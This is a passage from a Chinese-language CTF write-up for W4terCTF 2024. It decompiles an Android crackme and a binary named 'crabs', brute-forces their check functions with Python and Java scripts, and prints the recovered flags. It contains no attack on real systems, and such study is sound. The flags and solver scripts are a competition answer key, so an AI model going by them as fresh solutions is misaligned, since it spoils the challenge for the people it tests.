class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(rival))</span><br><span class="line">my = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> rival:</span><br><span class="line">    my.append((x+<span class="number">1</span>)%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> my:</span><br><span class="line">    <span class="built_in">print</span>(x,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p></p><p>结果为</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1211111213313331123112111232113113213322122121121231121112122232132131121222112212133233122212211221121213221131133331131313223212313113132123311232131113211312123211311231131312221123133313111231311313212221123112321313232213211113132133311321131113123222</span><br></pre></td></tr></table></figure><p></p><p>粘贴到安卓程序中，得到以下 flag 片段</p><p><code>Android_is_very_interesting_and_</code></p><h3 id="第二问猜数字"><a class="anchor" href="#第二问猜数字">#</a> 第二问：猜数字</h3><p>第二第三问需要以下工具</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phdmEtZGVjb21waWxlci9qZC1ndWk=">https://github.com/java-decompiler/jd-gui</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B4YjE5ODgvZGV4Mmphcg==">https://github.com/pxb1988/dex2jar</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2thdHJpbmF3ai9hcnRpY2xlL2RldGFpbHMvODAwMTYzMTU=">https://blog.csdn.net/katrinawj/article/details/80016315</span></p><p>这样反编译可以得到 java 代码，可读性比 smali 更优</p><p>在 <code>com/w4ter.w4terctf2024/SecondCheck.class</code> ，其中的函数 <code>check0</code> 到 <code>check15</code> 就是分别对 16 个数字进行检验</p><p>以 <code>check10</code> 为例，</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">check10</span><span class="params">(<span class="type">int</span> paramInt)</span> &#123;</span><br><span class="line">  paramInt = xor(xor(xor(add(mul(add(mul(xor(add(mul(sub(paramInt, <span class="number">5</span>), <span class="number">2</span>), <span class="number">3</span>), <span class="number">8</span>), <span class="number">11</span>), <span class="number">8</span>), <span class="number">14</span>), <span class="number">14</span>), <span class="number">6</span>), <span class="number">10</span>), <span class="number">13</span>);</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">if</span> (sub(mul(xor(sub(add(paramInt, <span class="number">1</span>), <span class="number">9</span>), <span class="number">12</span>), <span class="number">3</span>), <span class="number">4</span>) != <span class="number">1117943</span>)</span><br><span class="line">    bool = <span class="literal">false</span>; </span><br><span class="line">  <span class="keyword">return</span> bool;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>使用下面的 python 脚本，可以枚举出第 10 个数字</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a ^ b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a - b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a * b</span><br><span class="line"></span><br><span class="line">i=<span class="number">10</span></span><br><span class="line">up = <span class="number">2</span>**(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, up+<span class="number">1</span>):</span><br><span class="line">    paramInt = j</span><br><span class="line">    paramInt = xor(xor(xor(add(mul(</span><br><span class="line">        add(mul(xor(add(mul(sub(paramInt, <span class="number">5</span>), <span class="number">2</span>), <span class="number">3</span>), <span class="number">8</span>), <span class="number">11</span>), <span class="number">8</span>), <span class="number">14</span>), <span class="number">14</span>), <span class="number">6</span>), <span class="number">10</span>), <span class="number">13</span>)</span><br><span class="line">    i = sub(paramInt, <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (sub(mul(xor(sub(add(paramInt, <span class="number">1</span>), <span class="number">9</span>), <span class="number">12</span>), <span class="number">3</span>), <span class="number">4</span>) != <span class="number">1117943</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>运行结果是 1217</p><p>类似的，可以得到全部 16 个数字</p><p>2,3,7,14,18,44,82,235,365,715,1217,3774,6025,14042,28572,51291</p><p>输入到安卓程序中，得到以下 flag 片段</p><p><code>Smkhwxi8wnGu14Jq</code></p><h3 id="第三问直捣黄龙"><a class="anchor" href="#第三问直捣黄龙">#</a> 第三问：直捣黄龙</h3><p>在 <code>com/w4ter.w4terctf2024/ThirdCheck.class</code> ，其中的函数 <code>check0</code> 到 <code>check23</code> 就是分别对 24 个字母进行检验</p><p>与之前不同的是，代码中加入了些奇怪的东西</p><p><img data-src="https://s2.loli.net/2024/04/29/1cfaVgDsSPFkeyB.png" alt="android-3"></p><p>要想结束 while 循环，就必须执行 3 处的 break，所以正确的字母输入后一定会执行 2 和 3 处的代码</p><p>2 处的代码会用到 i 的值，如果输入正确的字母后，只执行 2 处代码没有执行 1 处的代码，i 的值就恒定为 0 而与 paramInt 无关，结果是 paramInt 输入任何值都是合法的，这显然不合理，所以 1 处的代码一定会被执行</p><p>综上分析，第三问混淆的代码应该不会影响正常的执行逻辑，可以直接无视。</p><p>和第二问一样，写出以下脚本枚举字符</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a ^ b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a - b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a * b</span><br><span class="line"></span><br><span class="line"><span class="comment"># paramInt = 2</span></span><br><span class="line"><span class="comment"># print(xor(xor(add(mul(add(xor(add(xor(sub(sub(add(xor(xor(paramInt, 1), 7), 7), 13), 8), 14), 5), 2), 12), 10), 14), 2), 5))</span></span><br><span class="line">up=<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,up+<span class="number">1</span>):</span><br><span class="line">    paramInt = j</span><br><span class="line">    i = sub(add(add(xor(paramInt, <span class="number">9</span>), <span class="number">3</span>), <span class="number">10</span>), <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> (sub(mul(xor(mul(i, <span class="number">1</span>), <span class="number">2</span>), <span class="number">3</span>), <span class="number">5</span>) == <span class="number">313</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>,<span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>可以得到第三个字符是 <code>l</code></p><p>类似的，可以枚举得出其他字符，结果为</p><p><code>I_like_Android_Reverse!!</code></p><h3 id="java脚本"><a class="anchor" href="#java脚本">#</a> java 脚本</h3><blockquote><p>更简便的方法？</p></blockquote><p>利用已有的 java 源代码可写 java 脚本爆破：</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.System;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> SecondCheck.SecondCheck;</span><br><span class="line"><span class="keyword">import</span> ThirdCheck.ThirdCheck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hack</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] ENC2 = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; </span><br><span class="line">        <span class="number">901</span>, <span class="number">1554</span>, <span class="number">17367</span>, <span class="number">53318</span>, <span class="number">68796</span>, <span class="number">19575</span>, <span class="number">1957</span>, <span class="number">1461</span>, <span class="number">485</span>, <span class="number">790</span>, </span><br><span class="line">        <span class="number">1281</span>, <span class="number">218036</span>, <span class="number">54829</span>, <span class="number">2367142</span>, <span class="number">28073245</span>, <span class="number">51410</span> &#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">char</span>[] flag1 = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= Math.pow(<span class="number">2</span>,<span class="number">16</span>); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)&#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> SecondCheck.class.getDeclaredMethod(<span class="string">&quot;check&quot;</span> + j, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="type">int</span>.class &#125;);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">if</span> (callCheck(method, (i))) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;flag&quot;</span> + j;</span><br><span class="line">                    Class&lt;Integer&gt; clazz = <span class="type">int</span>.class;</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> SecondCheck.class.getDeclaredMethod(str1, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; clazz, clazz &#125;);</span><br><span class="line">                    method2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    flag1[j] = (<span class="type">char</span>)callFlag(method2, ENC2[j], i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] flag2 = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">24</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">byte</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">24</span>; j++) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ThirdCheck.class.getDeclaredMethod(<span class="string">&quot;flag&quot;</span> + j, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="type">int</span>.class &#125;);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">if</span> (callFlag(method, i)) &#123;</span><br><span class="line">                    flag2[j] = (<span class="type">char</span>)i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(flag1);</span><br><span class="line">        System.out.println(flag2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">callFlag</span><span class="params">(Method paramMethod, <span class="type">int</span> paramInt)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> paramMethod.invoke(<span class="keyword">new</span> <span class="title class_">ThirdCheck</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; Integer.valueOf(paramInt) &#125;);</span><br><span class="line">        <span class="keyword">return</span> (object <span class="keyword">instanceof</span> Boolean) ? ((Boolean)object).booleanValue() : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">callFlag</span><span class="params">(Method paramMethod, <span class="type">int</span> paramInt1, <span class="type">int</span> paramInt2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> paramMethod.invoke(<span class="keyword">new</span> <span class="title class_">SecondCheck</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; Integer.valueOf(paramInt1), Integer.valueOf(paramInt2) &#125;);</span><br><span class="line">        <span class="keyword">return</span> (object <span class="keyword">instanceof</span> Integer) ? ((Integer)object).intValue() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">callCheck</span><span class="params">(Method paramMethod, <span class="type">int</span> paramInt)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> paramMethod.invoke(<span class="keyword">new</span> <span class="title class_">SecondCheck</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; Integer.valueOf(paramInt) &#125;);</span><br><span class="line">        <span class="keyword">return</span> (object <span class="keyword">instanceof</span> Boolean) ? ((Boolean)object).booleanValue() : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>命令：</p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Hack.java </span><br><span class="line">java Hack</span><br></pre></td></tr></table></figure><p></p><p>可以直接得到后面两关的 flag 片段:</p><p></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Smkhwxi8wnGu14Jq</span><br><span class="line">I_like_Android_Reverse!!</span><br></pre></td></tr></table></figure><p></p><h2 id="crabs"><a class="anchor" href="#crabs">#</a> crabs</h2><p>使用 IDA 进行逆向</p><p>反编译 main 函数：</p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter your flag, and get a picture&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v8);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_1209(&amp;v8) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here is your picture&quot;</span>);</span><br><span class="line">  sub_1483(&amp;qword_8390);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_2B4D(&amp;qword_8390, &amp;v8, v4, v5, v6, v7, v8, v9) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nonono, ugly picute&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;okokok, nice picture&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is W4terCTF&#123;%s&#125;\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p></p><h3 id="sub_1209"><a class="anchor" href="#sub_1209">#</a> sub_1209</h3><p><code>sub_1209</code> 的代码</p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)a1) == <span class="number">55</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">    qword_8360 = *(_QWORD *)a1;</span><br><span class="line">    qword_8368 = v2;</span><br><span class="line">    v3 = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">    qword_8370 = *(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">    qword_8378 = v3;</span><br><span class="line">    dword_8380 = *(_DWORD *)(a1 + <span class="number">32</span>);</span><br><span class="line">    byte_8384 = *(_BYTE *)(a1 + <span class="number">36</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">36</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (i ^ *((<span class="type">char</span> *)&amp;qword_8360 + i)) != byte_6020[i] )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_19:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;nonono, invalid&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_QWORD *)(a1 + <span class="number">46</span>);</span><br><span class="line">    qword_8390 = *(_QWORD *)(a1 + <span class="number">38</span>);</span><br><span class="line">    qword_8398 = v4;</span><br><span class="line">    byte_83A0 = *(_BYTE *)(a1 + <span class="number">54</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (*((<span class="type">char</span> *)&amp;qword_8390 + <span class="number">6</span> * j + k) &lt;= <span class="number">64</span> || *((<span class="type">char</span> *)&amp;qword_8390 + <span class="number">6</span> * j + k) &gt; <span class="number">90</span>)</span><br><span class="line">          &amp;&amp; (*((<span class="type">char</span> *)&amp;qword_8390 + <span class="number">6</span> * j + k) &lt;= <span class="number">96</span> || *((<span class="type">char</span> *)&amp;qword_8390 + <span class="number">6</span> * j + k) &gt; <span class="number">122</span>)</span><br><span class="line">          &amp;&amp; (*((<span class="type">char</span> *)&amp;qword_8390 + <span class="number">6</span> * j + k) &lt;= <span class="number">47</span> || *((<span class="type">char</span> *)&amp;qword_8390 + <span class="number">6</span> * j + k) &gt; <span class="number">57</span>)</span><br><span class="line">          || j &lt;= <span class="number">1</span> &amp;&amp; k == <span class="number">4</span> &amp;&amp; *((_BYTE *)&amp;qword_8390 + <span class="number">6</span> * j + <span class="number">5</span>) != <span class="number">95</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nonono, length wrong&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p></p><p>a1 即为输入的 flag，首先在 11 行对 flag 前 37 列进行异或处理，与 <code>byte_6020</code> 进行比对</p><p><code>byte_6020</code> 的内容如下</p><p><img data-src="https://s2.loli.net/2024/04/29/KdN6J9DZQ8PjMgk.png" alt="byte_6020"></p><p>用下面的脚本，可以推测 flag 前 37 个字符</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;@&#x27;</span>]</span><br><span class="line">b=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)==<span class="number">1</span>:</span><br><span class="line">        b.append(<span class="built_in">ord</span>(x))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        b.append(<span class="built_in">int</span>(x))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">    c.append(<span class="built_in">chr</span>(x^i))</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p></p><p>结果为 <code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd</code></p><p>代码 24 行之后限定了 flag 的 37 位之后的格式</p><p>得到 flag 为 <code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_aaaaa_aaaaa_aaaaa</code> ，其中 a 为未知</p><h3 id="sub_24bd"><a class="anchor" href="#sub_24bd">#</a> sub_24BD</h3><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 